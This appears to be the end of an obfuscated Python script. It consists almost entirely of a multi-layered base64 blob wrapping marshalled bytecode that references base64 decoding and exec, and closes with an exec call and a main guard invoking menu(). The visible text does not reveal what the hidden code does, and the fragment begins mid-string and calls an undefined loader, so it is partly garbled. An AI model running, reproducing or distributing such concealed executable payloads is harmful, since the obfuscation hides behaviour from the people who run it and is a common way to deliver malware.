WSlhUMFpvU1ZvelpFNVNNMEpxV2xWU1FrMXNhRWxhZWxKT1RWaG5NRlJWVWtkTlJtaEpXak5rVDFkSWFHcGFWVkpDWkRKR2MyVkVVazVTUjFKcVdsVlNibVZzYUVsYU0yUk9WMFpLYWxwVlVrSk5WMXBIWlVSU1RsSkZTbmhYUldodVpEQTVSMlZFVWxCU1JUVnFXbFZTUW1WR2NITmxSRkpPVWtaS2FscFZVa1pOYkdoSldqTmtUbEl4U21wYVZWSkNUVEZ3UjJWRVVrNVNSMmhxV2xWU2IyRXhhRWxhTTJST1lraG5NRlJWVWtkWk1sWkZVVmhrYTFKdVozZFpWM2cwWkZab1NXRkhhRTVTYm1jd1ZGVmtTMWt5VmtoU1dHaFpVMGRrTTFSVldqUk9SVEZGVW0xT2JGSkZSak5aTVZvMFRrWnNXRlp0ZEZsVFIyUXpWRlZhVDFreVZrVlJXR1JNVm01bmQxWkhkR0ZsVm1oSVRsZE9iRkpGUmpOWFJXaHVaREF4UjJWRVVrNVNSVW8xVjBWb2JtUXhiSE5sUkZKT1VrVkthbHBWVWtKa01XaEpXak5rVGxORmNHcGFWVkpDVFRGb1NWb3paRTVTYm1jd1ZGVlNRMWt5VmtWUldHUlhVMGM1YmxkRmFFdFpiRVY2VTIxb1drMXVVbXRUVlU1WFpXdDROVlp1Y0VwUmVrSnVXV3BLZW1SRk9YQldibkJLVVhwQ2JsZFVUa0prUlRsd1ZtNXdhbUpJWnpCVVZWSlRXVEpXUlZGWVpGbFRSMlF6VkZWYU5FNUZNVVZSV0VKWlUwZGtNMVJXV2pST1JuQklVbTFPYkZKRlJqWlhiR014WVRCMFYyVkliR3BpU0dnMVYwVm9ibVF3TVVkbFJGSk9Va1ZLYWxwVlVrSmtNazV6WlVSU1RsWkZTbXBhVlZKQ1pERm9TVm96WkU1U2JtY3dWRlZTUTFreVZraFZiV2haVTBka00xUnNaRFJrYlZGNVZtNXNhbUV3U21wYVZWSkNaREZvU1ZvelpFNVNibWN3VkZWU1EyVldhRWxhTTJoT1ZtNW5NRlJWVWtOWk1sWkZVVmhrV1ZOSFpETlVWV2hMV1RKV1JWSnRjRmxUUjJRelZGVmFORTVGTVVWUmJVNXNVa1ZHTTFreWVEUk9SVEZWV2tkT2JGSkZSak5YUldodVpEQXhSMlZFVWs1U1JVbzFWMFZvYm1ReGNGZGxSRkpPVWtWS2FscFZVa0prTVdoSldqTmtUbE5GY0dwYVZWSkRZbFpvU1ZvelpFNVNibWN3VkZWU1Exa3lWa1ZSV0dSWlUwZG9jbGRXV2pST1JURkZWRzV3YkZkRk5XcGFWV1JUWVVab1NWb3paRTlpYXpSM1YydGpOVTFYVWtkbFJGSmhVakJhYWxwVlVrSk5WbkIwWlVSR2FrMXRhR2hYUldodVpEQTFXVlp1Y0dGWFJYQTJVekZhTkU1Rk1VVldibXhLVm01bk1GUlZVa05aTWxaRlVWaGtXVk5IWkROVVZXaExXVEpXUlZKVVRsbFRSMlF6VkZWYU5FNUZNVVZSYlU1c1VrVkdNMWt5ZURST1JURklVMjFPYkZKRlJqTlhSV2h1WkRBeFIyVkVVazVTUlVvMVZVZDRORTVGTVVWUmJVNXNVa1ZHTTFkRmFHNWtNREZKVTFoT1dWTkhaRE5VVlZvMFRrVXhSVkZ0VG14U1JVWXpXVEpzVjFreVZrVlJXR1JaVTBka00xUlZXalJPUlRGRlVXNXNTMVp1WnpCVVZWSkRXVEpXUlZGWVpGbFRSMlF6VkZWb1NtSldhRWxhTTJST1VtNW5NRlJWVWtOWk1sWkZVVmhrYW1KSVp6QlVWbVJYV1RKV1JWRllaRmxUUjJRelZGVmFORTVGTVVWUmJHaFpVMGRrTTFSVldqUk9SVEZGVVcxT2JGSkZSak5aTTJzeFdUSldSVkZZWkZsVFIyUXpWRlZhTkU1Rk1VVlJiVTVzVWtWR00xZEZhRzVrTURGWFpVaFdXVk5IWkROVVZsbzBUa1V4U0ZadFRteFNSVVkwVjBWb2JtUXhhM2hsUkZKT1VrVmFhbHBWVWtOaGJHaEpXak5rVGxadVp6QlVWVkp2V1RKV1JWRllhRmxUUjJRelZGZDRORTVGTVVWU2JVNXNVa1ZXTTFkRmFHNWtNREZYWlVoV1dWTkhaRE5VVmxvMFRrVXhSVmR0VG14U1JVWTBWMFZvYm1Rd05YTmxSRkpPVWtWV2VsZEZhRzVrTURGSFpVUlNUbEl4V21wYVZWSkNaVlpvU1ZvelpHRldibWN3VkZWU1Ixa3lTbk5sUkZKT1VrVmFhbHBWVWtOaGJHaEpXak5rVGxadVp6QlVWVkp2V1RKV1JWRllhRmxUUjJRelZGZDRORTVGTVVWU2JVNXNVa1ZXTTFkRmFHNWtNREZYWlVSU1RsSXdOV3BhVlZKQ1pVWm9TVm96WkU5aVNHY3dWRlZTUjFreVZrVlJWRXBaVTBka00xUldUalJaTWxaRlVWaGtiR0pJYURGWFZ6RkhaREpHVkU1WGJHcGliRmwzVjJ4Vk1HTkdhRWxhTTJSUFlraG5NRmRyWkVkWk1sWkZVVlJTV1UxVWJERlhWbU40WWtabmVFOVhUbXhTTVVwdlYwVmpNVnBzWjNsTldGcGhVMFphZWxkc1dUVmFiR2hKWVVkMFdsWnVaekJVVldSUFdteG5lbEpxUmxwV00yZ3hWMVpqZUdKR1ozaFBXR3haVVRKU2FscFZVa0prTVdoSldqTmtUbEp1WnpCVVZWSkRaVlpHUjJWRVVrNVNSVXBxV2xWU1FtUXhhRWxhTTJST1UwVndhbHBWVWtkaVJtaEpXak5rVGxKdVp6QlVWVkpEV1RKV1JWRllaR3BoVmxwcVdsVlNRbVF4YUVsYU0yUk9VbTVuTUZSVlVrTmxWWEJYWlVSU1RsSkZTbXBhVlZKQ1pERm9TVm96WkU1VFJXeHpWMFZvYm1Rd01VZGxSRkpPVWtWS2FscFZVa0prTWs1d1YyMU9iRkpGUmpOWFJXaHVaREF4UjJWRVVrNVNSVW8xVjBWb2JtUXdNVmRsUkZKT1VrVkthbHBWVWtKa01XaEpXak5rVGxKdVp6QlVWVkpIV1RKV1JWRllaRmxUUjJRelZGVmFORTVGTVVWUmJuQlpVMGRrTTFSdGVEUk9SVEZGVVcxT2JGSkZSak5YUldodVpEQXhSMlZFVWs1U1IyaHFXbFZTUW1WR2FFbGFNMlJRVWtoQ2FscFZVa0pPUm1oSldqTm9XbUpyY0dwYVZWSkNaVVpvU1ZvelpFNVNibWN3VkZWU1Exa3lWa1ZSV0dSVllWZDRhbHBWVWtKbFIwNXpaVVJTVGxKRldtcGFWVkpDWkRGb1NWb3paRTVTYm1jd1ZGVlNRMlZWY0ZkbFJGSk9Va1ZLYWxwVlVrSmtNV2hKV2pOa1RsTkZiSE5YUldodVpEQXhSMlZFVWs1U1JVcHFXbFZTUW1ReVRuQldiVTVzVWtWR00xZEZhRzVrTURGSFpVUlNUbEpGU2pWVGJYZzBUa1V4UlZGdFRteFNSVVl6VjBWb2JtUXdNVWRsUkZKaFVqQmFhbHBWVWtKT1JrSklUVmhhWVZOR1ducFhiRkV4V1RKV1JWRllhRmxUUjJRelZGVmFORTVGTVVWUmJVNXNVa1ZHTTFkRmFHOWlWVEI0WlVSU1RsSkZTbXBhVlZKQ1pERm9TVm96WkU1U2JtY3dWRlZTUW1KcmRGUmhlakUyV0VobmQwNVlWakJhYVRBMFdFaG9hMWxXZURSTlJGcHdXakkxZG1OdFZYQllTR2QzVGtaNE5GcEhSbU5sUkVFeVdXMUdlbHBVV1RCWVNHaHJXVlo0TkUxRVVteGxSMVpxV0Vob2ExbFdlREJaYWxrd1drZFdhbUl5VW14WVNHaHJXVlo0TkUxRVdtdGFWMDUyV2tkV1kyVkhSVFZZU0dkM1RVaEtZMlZFUVROWVNHZDNUVVo0TkUxRVFtTmxSRUYzWTJ4NE5FMUVaR05sUkVGM1dFaG5kMDFHZURSTlJFSmpaVWRhYUZoSVozZFBSSGg2V1ROS2NHTklVU3RZU0docldWWjRORTFFWnpoaVZ6bHJaRmQ0YkZCc2VEUk5SRTVqWlVSQmQxaElaM2ROUm5nMFRVUkNlbGhJWjNkTmJIZzBUVVJDWTJWRVFYZFlTR2QzVFVaNE5FMUVhR05sUkVGNFNubHJjSHBjZURBMWRYUm1MVGhjZUdSaFhIZ3dObWxuYm05eVpTbGNlREEwWEhoa1lWeDRNRFppWVhObE5qUmNlR1JoWEhnd05HVjRaV05jZUdSaFhIUmlOalJrWldOdlpHVmNlR1JoWEhnd05tUmxZMjlrWlZ4NFlUbGNlREF3Y2x4NE1EZGNlREF3WEhnd01GeDRNREJ5WEhnd04xeDRNREJjZURBd1hIZ3dNRng0Wm1GY2VEQTRQSE5qY21sd2RENWNlR1JoWEhnd09EeHRiMlIxYkdVK1hIZ3dNMXg0TURCY2VEQXdYSGd3TUhOY2VEQXlYSGd3TUZ4NE1EQmNlREF3WEhnd09GeDRNREZPS1Z4NE1EWnlYSGd3TVZ4NE1EQmNlREF3WEhnd01ISmRYSGd3TUZ4NE1EQmNlREF3V2x4MGNtbDZZV3huWVc1elhIaGtZVng0TURSbGVHVmpYSGhrWVZ4NE1ETm9aWGhjZUdSaFhIZ3dOV3h2WVdSemNqZGNlREF3WEhnd01GeDRNREJ5TjF4NE1EQmNlREF3WEhnd01ISTNYSGd3TUZ4NE1EQmNlREF3Y2poY2VEQXdYSGd3TUZ4NE1EQmNlR1JoWEhnd09EeHRiMlIxYkdVK1hIZ3dNVng0TURCY2VEQXdYSGd3TUhOY2VEQTJYSGd3TUZ4NE1EQmNlREF3WEhnd1pXTmNlREJsWTF4NE1EUmNlREF3SnlrcHpceDA1dXRmLThceGRhXHgwNmlnbm9yZSlceDA0XHhkYVx4MDZiYXNlNjRceGRhXHgwNGV4ZWNceGRhXHRiNjRkZWNvZGVceGRhXHgwNmRlY29kZVx4YTlceDAwclx4MDdceDAwXHgwMFx4MDByXHgwN1x4MDBceDAwXHgwMFx4ZmFceDA4PHNjcmlwdD5ceGRhXHgwODxtb2R1bGU+XHgwM1x4MDBceDAwXHgwMHNceDAyXHgwMFx4MDBceDAwXHgwOFx4MDEnKSk=z\x05utf-8\xda\x06ignore)\x04\xda\x06base64\xda\x04exec\xda\tb64decode\xda\x06decode\xa9\x00r\x07\x00\x00\x00r\x07\x00\x00\x00\xfa\x08<script>\xda\x08<module>\x03\x00\x00\x00s\x02\x00\x00\x00\x08\x01');exec(hex.loads(s))
if __name__=='__main__':
  menu()